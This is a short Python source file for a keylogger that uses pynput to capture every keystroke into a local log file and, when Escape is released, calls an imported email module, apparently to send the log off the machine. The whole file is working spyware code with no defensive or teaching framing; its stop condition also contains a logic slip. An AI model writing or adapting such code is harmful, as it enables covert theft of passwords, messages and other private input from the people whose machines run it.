from sendEmail import sndEmail
from pynput.keyboard import Key, Listener

logFile : str = 'logs/log.txt'

def writeLog(key):
    keydata = str(key).replace("'", "")
    translate_keys = {
        "space": " ",
        "Key.shift_r": "",
        "Key.shift_l": "",
        "enter": " ",
        "Key.": " ",
        "Key.alt": "",
        "Key.esc": "",
        "Key.cmd": "",
        "Key.caps_lock": "",
        "Key.ctrl_l\x1a": 'CTRL-Z',
        "back": "",
        "Key.shift": "",
        "Key.ctrl_l": "",
        "\x1a": "",
        "Key.tab": "",
        "ctrl_l": "ctrl",
        "ctrl_r": "ctrl"
    }

    for key in translate_keys:
        keydata = keydata.replace(key, translate_keys[key])

    with open(logFile, "a") as l:
        l.write(keydata)


def stopKeyLogger(key):
    if key == Key.esc and Key.f2:
        email = sndEmail()
        email.timeToSend()
        return False

with Listener(on_press=writeLog, on_release=stopKeyLogger) as listener:
    listener.join()

